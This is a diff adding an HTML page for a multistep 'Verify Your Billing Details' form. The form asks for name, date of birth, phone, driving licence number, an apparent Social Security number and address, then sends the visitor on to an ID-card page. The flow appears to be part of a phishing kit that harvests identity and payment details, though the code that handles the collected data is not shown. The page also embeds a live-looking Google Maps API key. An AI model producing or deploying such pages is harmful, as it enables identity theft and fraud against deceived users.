@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="index.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" />
+</head>
+
+<body>
+  <header class="red-background">
+    <div class="container">
+      <div class="logo-header">
+        <img src="images/CTZ_Green-01.png" alt="">
+      </div>
+    </div>
+  </header>
+  <!-- MultiStep Form -->
+  <div class="container-fluid" id="grad1">
+    <div class="row justify-content-center mt-0">
+      <div class="col-12 col-sm-9 col-md-7 col-lg-6 text-center p-0 mb-2">
+        <div class="card px-0 pt-4 pb-4">
+          <div class="col-md-12 mx-0">
+            <form id="msform">
+              <!-- progressbar -->
+              <ul id="progressbar">
+                <li class="active" id="account">
+                  <strong>Account</strong>
+                </li>
+                <li id="personal" class="active"><strong>Payment</strong></li>
+                <li id="payment" class="active"><strong>Billing</strong></li>
+                <li id="profile"><strong>Profile</strong></li>
+                <li id="confirm"><strong>Finish</strong></li>
+              </ul>
+              <h2><strong>Verify Your Billing Details</strong></h2>
+              <p class="para">
+                For Lorem ipsum, dolor sit amet consectetur adipisicing elit.
+                Similique, illo. Nemo recusandae architecto
+              </p>
+              <div class="Biiling-card" id="Billing-card">
+                <div class="container">
+                  <div class="row">
+                    <div class="col-md-7 col-sm-6 mb-4">
+                      <span >Card Holder Name</span>
+                      <input type="text" placeholder="Full Name" class="validation letters" onkeyup="valid()" />
+                    </div>
+                    <div class="col-md-5 col-sm-6 mb-4">
+                      <span >Date of Birth</span>
+                      <input type="text" id="datepicker" placeholder="Date of Birth" autocomplete="off">
+                    </div>
+                    <div class="col-md-6 col-sm-6 mb-4">
+                      <span >Phone</span>
+                      <input id="phone" type="number" name="phone" />
+                    </div>
+                    <div class="col-md-6 col-sm-6 mb-4">
+                      <span >Driving Number</span>
+                      <input type="number" placeholder="Driving Number" class="okay" onkeyup="valid()" required />
+                    </div>
+                    <div class="col-md-7 col-sm-6 mb-4">
+                      <span >American Number</span>
+                      <input type="number" placeholder="American" class="lets" onkeyup="valid()" />
+                    </div>
+                    <div class="col-md-5 col-sm-6 mb-4">
+                      <span >Number</span>
+                      <input type="number" placeholder=" Number" required class="try" onkeyup="valid()" />
+                    </div>
+                    <div class="col-md-8 col-sm-6 mb-4">
+                      <span >Street Adress</span>
+                      <input type="text" placeholder="Street Adress"  id="ship-address" class="old" onkeyup="valid()" required />
+                    </div>
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <span >Zip Code</span>
+                      <input type="number" placeholder="Zip Code" class="another" onkeyup="valid()" />
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="button-main">
+                <a href="#" type="submit" class="action-button" onclick="locationChange()">Continue</a>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="index.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js" integrity="sha256-T0Vest3yCU7pafRw9r+settMBX6JkKN06dqBnpQ8d30=" crossorigin="anonymous"></script>
+  
+  <script
+  src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartNGg&callback=initAutocomplete&libraries=places&v=weekly"
+  defer></script>
+
+  <script>
+
+
+
+    function locationChange() {
+      window.location.assign("../ID-Card/index.html");
+    }
+
+    function backLocation() {
+      window.location.assign("../card/card.html");
+    }
+    const phoneInputField = document.querySelector("#phone");
+    const phoneInput = window.intlTelInput(phoneInputField, {
+      preferredCountries: ["us", "co", "in", "de"],
+      utilsScript:
+        "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+    });
+
+    function getIp(callback) {
+      fetch('https://ipinfo.io/json?', { headers: { 'Accept': 'application/json' } })
+        .then((resp) => resp.json())
+        .catch(() => {
+          return {
+            country: 'us',
+          };
+        })
+        .then((resp) => callback(resp.country));
+    }
+
+  </script>
+</body>
+
+</html>
